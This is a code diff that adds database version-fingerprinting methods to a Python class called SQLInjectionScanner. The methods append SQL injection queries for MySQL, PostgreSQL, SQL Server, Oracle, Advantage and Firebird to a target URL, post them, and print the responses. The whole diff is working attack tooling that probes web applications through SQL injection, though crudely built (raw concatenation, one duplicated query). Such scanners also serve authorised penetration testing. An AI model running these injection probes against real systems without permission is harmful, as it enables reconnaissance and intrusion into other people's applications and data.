@@ -59,6 +59,110 @@ class SQLInjectionScanner:
         else:
             print(f"Unsupported database type: {self.database_type}")
 
+    async def perform_mysql_get_version(self):
+        print("MySQL: Retrieving Database version...")
+        for query in [
+            "SELECT @@version; --",
+            "SELECT VERSION(); --",
+            "SELECT @@GLOBAL.VERSION; --",
+            "SELECT @@VERSION; --",
+        ]:
+            post_data = {}
+            full_url = f'{self.target_url}+{query}'
+
+            try:
+                async with self.session.post(full_url, data=post_data) as response:
+                    result = await response.text()
+                    print(result)
+            except Exception as e:
+                print(f"Error performing POST request for query '{query}': {e}")
+
+    async def perform_postgre_get_version(self):
+        print("PostgreSQL: Retrieving Database version...")
+        for query in [
+            "SELECT version(); --",
+            "SELECT current_setting('server_version'); --",
+            "SELECT setting FROM pg_settings WHERE name = 'server_version'; --",
+        ]:
+            post_data = {}
+            full_url = f'{self.target_url}+{query}'
+
+            try:
+                async with self.session.post(full_url, data=post_data) as response:
+                    result = await response.text()
+                    print(result)
+            except Exception as e:
+                print(f"Error performing POST request for query '{query}': {e}")
+
+    async def perform_microsoftsql_get_version(self):
+        print("Microsoft SQL Server: Retrieving Database version...")
+        for query in [
+            "SELECT @@VERSION; --",
+            "SELECT SERVERPROPERTY('productversion'); --",
+            "SELECT SERVERPROPERTY('productlevel'); --",
+        ]:
+            post_data = {}
+            full_url = f'{self.target_url}+{query}'
+
+            try:
+                async with self.session.post(full_url, data=post_data) as response:
+                    result = await response.text()
+                    print(result)
+            except Exception as e:
+                print(f"Error performing POST request for query '{query}': {e}")
+
+    async def perform_oracle_get_version(self):
+        print("Oracle: Retrieving Database version...")
+        for query in [
+            "SELECT banner FROM v$version; --",
+            "SELECT * FROM v$version; --",
+            "SELECT version FROM v$instance; --",
+        ]:
+            post_data = {}
+            full_url = f'{self.target_url}+{query}'
+
+            try:
+                async with self.session.post(full_url, data=post_data) as response:
+                    result = await response.text()
+                    print(result)
+            except Exception as e:
+                print(f"Error performing POST request for query '{query}': {e}")
+
+    async def perform_advantage_get_version(self):
+        print("Advantage Database: Retrieving Database version...")
+        for query in [
+            "SELECT AdsVersion(); --",
+            "SELECT AdsVersion(); --",
+            "SELECT AdsExtendedReader('SELECT AdsVersion()', AdsConnection()); --",
+        ]:
+            post_data = {}
+            full_url = f'{self.target_url}+{query}'
+
+            try:
+                async with self.session.post(full_url, data=post_data) as response:
+                    result = await response.text()
+                    print(result)
+            except Exception as e:
+                print(f"Error performing POST request for query '{query}': {e}")
+
+    async def perform_firebird_get_version(self):
+        print("Firebird: Retrieving Database version...")
+        for query in [
+            "SELECT @@VERSION; --",
+            "SELECT rdb$get_context('SYSTEM', 'ENGINE_VERSION') FROM rdb$database; --",
+            "SELECT rdb$get_context('SYSTEM', 'ODS_VERSION') FROM rdb$database; --",
+        ]:
+            post_data = {}
+            full_url = f'{self.target_url}+{query}'
+
+            try:
+                async with self.session.post(full_url, data=post_data) as response:
+                    result = await response.text()
+                    print(result)
+            except Exception as e:
+                print(f"Error performing POST request for query '{query}': {e}")
+
+
     async def get_database_name(self):
         print(f"Getting database name for {self.database_type} database...")
 
